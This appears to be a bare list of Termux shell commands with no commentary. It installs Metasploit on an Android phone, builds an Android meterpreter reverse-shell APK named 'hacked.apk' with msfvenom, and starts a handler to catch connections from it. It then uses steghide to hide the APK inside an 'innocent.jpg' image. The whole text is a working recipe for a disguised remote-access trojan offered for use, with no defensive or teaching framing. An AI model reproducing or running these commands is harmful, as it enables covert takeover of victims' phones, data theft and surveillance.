pkg update && pkg upgrade -y

pkg install wget curl openssh git -y

wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh

chmod +x metasploit.sh
./metasploit.sh

msfconsole

msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -o hacked.apk

use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4444
exploit

pkg update && pkg upgrade -y
pkg install steghide -y

steghide embed -cf innocent.jpg -ef payload.apk -p password123

steghide extract -sf innocent.jpg -p password123